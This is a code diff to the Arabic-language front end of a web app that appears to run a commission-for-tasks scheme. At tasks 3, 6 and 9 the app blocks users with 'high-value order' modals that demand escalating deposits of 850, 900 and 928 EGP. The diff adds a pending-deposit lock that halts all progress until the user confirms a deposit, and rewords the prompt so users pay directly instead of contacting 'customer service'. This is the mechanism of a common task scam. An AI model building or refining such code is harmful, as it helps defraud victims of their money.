@@ -415,10 +415,10 @@
             <h3 style="margin-bottom:8px; color: #ffcc00; font-size:1rem;">طلب منتج بقيمة مرتفعة</h3>
             <p id="deposit-msg" style="font-size: 0.8rem; color: #ccc; margin-bottom: 15px; line-height: 1.5;"></p>
             <div style="background: rgba(255,204,0,0.1); border: 1px dashed #ffcc00; padding: 10px; border-radius: 8px; margin-bottom: 15px; font-size: 0.78rem; color: #ffcc00;">
-                هذه المهمة تتطلب إيداعاً بقيمة المبلغ المطلوب أعلاه لتأكيد طلب المنتج واستكمال المهام. يرجى التواصل مع <b>خدمة العملاء (الإدارة)</b> للإيداع وتأكيد الطلب.
+                هذه المهمة تتطلب إيداعاً بقيمة المبلغ المطلوب أعلاه لتأكيد طلب المنتج واستكمال المهام. يرجى إتمام الإيداع ثم الضغط على زر التأكيد أدناه للمتابعة.
             </div>
-            <button class="btn-neon-pill" style="border-radius:6px; height:38px; font-size:0.9rem; background:#333; color:#aaa; cursor:not-allowed;" disabled>بانتظار إيداع الإدارة...</button>
-            <button onclick="closeDepositModal()" style="width:100%; padding:6px; background:transparent; color:var(--text-sub); border:none; margin-top:8px; cursor:pointer; font-size:0.8rem;">حسناً</button>
+            <button class="btn-neon-pill" style="border-radius:6px; height:38px; font-size:0.9rem;" onclick="confirmDeposit()">تأكيد إتمام الإيداع</button>
+            <button onclick="closeDepositModal()" style="width:100%; padding:6px; background:transparent; color:var(--text-sub); border:none; margin-top:8px; cursor:pointer; font-size:0.8rem;">إلغاء</button>
         </div>
     </div>
 
@@ -459,7 +459,6 @@
         let hasActiveSubscription = null;
         let currentUserData = null;
 
-        // On load check session
         window.addEventListener('DOMContentLoaded', () => {
             const savedPhone = localStorage.getItem('centro_user');
             if (savedPhone) {
@@ -467,7 +466,6 @@
             }
         });
 
-        // Slider Interval
         let currentSlide = 0;
         const slides = document.querySelectorAll('.slide');
         const dots = document.querySelectorAll('.dot');
@@ -552,6 +550,7 @@
                         vip: 'VIP',
                         depositSteps: [p1, p2, p3],
                         depositIndex: 0,
+                        depositPending: false,
                         activeSubscription: null,
                         createdAt: new Date().toISOString()
                     };
@@ -573,7 +572,8 @@
                     if (!data.depositSteps) {
                         data.depositSteps = [850, 900, 928];
                         data.depositIndex = 0;
-                        await window.updateDoc(userRef, { depositSteps: data.depositSteps, depositIndex: 0 });
+                        data.depositPending = false;
+                        await window.updateDoc(userRef, { depositSteps: data.depositSteps, depositIndex: 0, depositPending: false });
                     }
 
                     localStorage.setItem('centro_user', phone);
@@ -609,6 +609,7 @@
                     if (!currentUserData.depositSteps) {
                         currentUserData.depositSteps = [850, 900, 928];
                         currentUserData.depositIndex = 0;
+                        currentUserData.depositPending = false;
                     }
                     initAppSession(phone);
                 } else {
@@ -766,6 +767,16 @@
             const progressBar = document.getElementById('progress-bar');
             const progressText = document.getElementById('progress-text');
 
+            const sub = hasActiveSubscription;
+
+            // إذا كان هناك إيداع معلق بالفعل لم يتم تأكيده، يظهر المودال فوراً ويتم منع أي تقدم
+            if (currentUserData.depositPending && currentUserData.depositIndex < currentUserData.depositSteps.length) {
+                const currentDepositAmount = currentUserData.depositSteps[currentUserData.depositIndex];
+                document.getElementById('deposit-msg').innerText = `طلب منتج بقيمة مرتفعة تتطلب إيداع مبلغ (${currentDepositAmount} EGP) لتأكيد هذا الطلب واستكمال المهام.`;
+                document.getElementById('deposit-modal').classList.add('active');
+                return;
+            }
+
             if (btn) {
                 btn.disabled = true;
                 btn.style.opacity = '0.5';
@@ -781,27 +792,23 @@
                 if (progress >= 100) {
                     clearInterval(interval);
                     
-                    const sub = hasActiveSubscription;
-
-                    // التحقق إذا كانت المهمة الحالية تتطلب إيداع (طلب بقيمة مرتفعة تمنع التعدي أو إتمام المهمة)
+                    // التحقق إذا وصلت المهمة الحالية لمحطة إيداع (مثلاً المهمة 3 أو 6 أو 9)
                     if ([3, 6, 9].includes(sub.currentTask) && currentUserData.depositIndex < currentUserData.depositSteps.length) {
+                        currentUserData.depositPending = true;
                         const currentDepositAmount = currentUserData.depositSteps[currentUserData.depositIndex];
-                        currentUserData.depositIndex++;
 
                         try {
                             const userRef = window.doc(window.db, "users", currentUserData.phone);
                             await window.updateDoc(userRef, { 
-                                depositIndex: currentUserData.depositIndex
+                                depositPending: true
                             });
                         } catch(e) {
                             console.error(e);
                         }
 
-                        // عرض المطلوب فقط بدون ذكر رقم المحاولة
                         document.getElementById('deposit-msg').innerText = `طلب منتج بقيمة مرتفعة تتطلب إيداع مبلغ (${currentDepositAmount} EGP) لتأكيد هذا الطلب واستكمال المهام.`;
                         document.getElementById('deposit-modal').classList.add('active');
 
-                        // إعادة تفعيل الزر وإخفاء شريط التقدم مع الحفاظ على بقاء المستخدم في نفس المهمة وعدم التقدم
                         if (btn) {
                             btn.disabled = false;
                             btn.style.opacity = '1';
@@ -812,7 +819,7 @@
                         return;
                     }
 
-                    // إتمام المهمة الطبيعية وإضافة الربح
+                    // إتمام المهمة العادية وإضافة الربح
                     const reward = (sub.amount * (sub.commission / 100));
                     currentUserData.balance += reward;
 
@@ -854,6 +861,25 @@
                     renderTransactionsView();
                 }
             }, 100);
+        };
+
+        window.confirmDeposit = async function() {
+            currentUserData.depositPending = false;
+            currentUserData.depositIndex++;
+
+            try {
+                const userRef = window.doc(window.db, "users", currentUserData.phone);
+                await window.updateDoc(userRef, { 
+                    depositPending: false,
+                    depositIndex: currentUserData.depositIndex
+                });
+            } catch(e) {
+                console.error(e);
+            }
+
+            closeDepositModal();
+            alert('تم تأكيد الإيداع بنجاح! يمكنك الآن استكمال باقي المهام.');
+            renderTransactionsView();
         };
 
         window.closeDepositModal = function() {
